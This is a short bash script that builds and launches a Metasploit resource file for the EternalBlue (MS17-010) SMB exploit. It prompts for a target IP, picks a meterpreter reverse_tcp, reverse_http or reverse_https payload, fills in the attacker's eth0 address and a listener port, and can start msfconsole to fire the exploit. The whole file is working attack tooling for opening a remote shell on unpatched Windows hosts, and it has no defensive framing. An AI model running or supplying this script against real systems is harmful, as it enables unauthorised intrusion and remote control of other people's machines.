#! /bin/bash

echo "//////////////////////////////////////////////////////"
echo "			Eternalblue[MS17_010]"
echo "//////////////////////////////////////////////////////"

printf "This is a simple program that creates a resource file that can be used upon starting up with msfconsole"
printf "\n\n\n"

function payload()
{
	printf "Set a payload:  \n1:reverse_tcp  \n2:reverse_http  \n3:reverse_https  \n" 
	read pl
	
		pload="windows/x64/"

	case $pl in
		1)
			pload+="meterpreter/reverse_tcp"
			;;
		2)	
			pload+="meterpreter/reverse_http"
			;;
		3)
			pload+="meterpreter/reverse_https"
			;; 
		*)
			pload+="meterpreter/reverse_tcp"
			;;
	esac
	
	#host ip will be set dynamically
	host="$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')" 

	#portnumber
	read -p "Select port number as listener [444] :  " port
	if [ -z $port ]
	then
		port="444"
	fi
}




read -p "Please enter the target host IP address: " target
while [ -z $target ]
do
	read -f "Error, please enter the target's IP address" target
done

payload

printf "Preparing to generate the resource file...\n"


#wipe clean if exist
if [ -f eb.rc ]
then
	> eb.rc
	
fi

#commands in the resource file
echo use exploit/windows/smb/ms17_010_eternalblue >> eb.rc
echo set rhosts $target >> eb.rc
echo set payload $pload >> eb.rc
echo set lhost $host >> eb.rc
echo set lport $port >> eb.rc
echo exploit >> eb.rc


sleep 0.5s
read -p "Resource file generated, would you want to run the handler on a new terminal?[y/n] " eb
if [ $eb = "y" ] || [ $eb = "Y" ]
then
	printf "running eternalblue on new terminal...\n\n"
	gnome-terminal -- msfconsole -r eb.rc
fi

printf "exiting....\n\n"

